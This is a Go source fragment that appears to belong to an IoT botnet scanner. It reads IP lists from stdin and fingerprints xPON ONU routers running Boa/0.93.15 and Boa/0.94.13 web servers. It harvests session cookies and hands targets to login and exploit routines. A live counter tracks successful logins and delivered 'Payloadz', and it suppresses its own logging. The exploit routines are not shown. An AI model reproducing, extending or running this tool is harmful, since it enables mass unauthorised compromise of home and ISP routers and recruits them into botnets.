	url = "http://" + info.ip + ":" + info.port + "/"

	tr := &http.Transport{
		ResponseHeaderTimeout: 10 * time.Second,
		DisableCompression:    true,
		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
	}

	info.client = &http.Client{Transport: tr, Timeout: 10 * time.Second}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return
	}

	resp, err := info.client.Do(req)
	if err != nil {
		return
	}
	resBody, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		return
	}
	if strings.Contains(string(resBody), "xPON ONU") || strings.Contains(fmt.Sprint(resp.Header), "xPON ONU") {
		resp.Body.Close()
		for k, v := range resp.Header {
			if strings.Contains(string(k), "Set-Cookie") {
				info.sID = GetSessionID(string(v[0]))
				if len(info.sID) > 0 {
					//fmt.Printf("[xBOA] Found X-Boa SID \"%s\"! Attempting login\r\n", info.sID)
					statusFound++
					process_xboa(info)
				}
				break
			}

		}
		info.client.CloseIdleConnections()
		return
	} else if strings.Contains(string(resBody), "Boa/0.93.15") || strings.Contains(fmt.Sprint(resp.Header), "Boa/0.93.15") {
		resp.Body.Close()
		statusFound++
		process_fboa(info)
		info.client.CloseIdleConnections()
		return
	} else if strings.Contains(string(resBody), "Boa/0.94.13") || strings.Contains(fmt.Sprint(resp.Header), "Boa/0.94.13") {
		resp.Body.Close()
		for k, v := range resp.Header {
			if strings.Contains(string(k), "Set-Cookie") {
				info.sID = GetSessionID(string(v[0]))
				if len(info.sID) > 0 {
					//fmt.Printf("[BOA] Found boa SID \"%s\"! Attempting login\r\n", info.sID)
					statusFound++
					process_boa(info)
				}
				break
			}
		}
		info.client.CloseIdleConnections()
		return
	} else if strings.Contains(string(resBody), "Boa/0.94.13") || strings.Contains(fmt.Sprint(resp.Header), "Boa/0.94.13") {

	}

	resp.Body.Close()
	info.client.CloseIdleConnections()

	return
}

func remove_conn() {
	statusConns--
}

func work(ip string, port int) {
	statusConns++
	defer remove_conn()
	statusAttempted++

	targ_port := port

	s_pre := strings.Split(ip, " ") // remove auths from found output logs
	s := strings.Split(s_pre[0], ":")
	if len(s) > 1 {
		targ_port, _ = strconv.Atoi(s[1])
	}

	info := scanner_info{
		rom_logins: 0,
		sID:        "",
		ip:         strings.TrimRight(s[0], "\r\n"),
		port:       strconv.Itoa(targ_port),
		user:       "",
		pass:       "",
		admin_user: []string{},
		admin_pass: []string{},
		client:     nil,
		wan:        "1_INTERNET_R_VID_",
	}

	do_hdr_check(&info)
	return
}

func main() {
	log.SetOutput(ioutil.Discard)

	go func() {
		for {
			fmt.Printf("Total [%d] Conns: [%d] Found [%d] Login [%d] Rom: [%d] Payloadz: [%d]\r\n", statusAttempted, statusConns, statusFound, statusLogins, statusRom, statusPayload)
			time.Sleep(1 * time.Second)
		}
	}()

	arg_port, _ := strconv.Atoi(os.Args[1])
	port := arg_port

	r := bufio.NewReader(os.Stdin)
	scan := bufio.NewScanner(r)
	for scan.Scan() {
		go work(scan.Text(), port)
		time.Sleep(100 * time.Nanosecond)
	}
	time.Sleep(200 * time.Second)
}
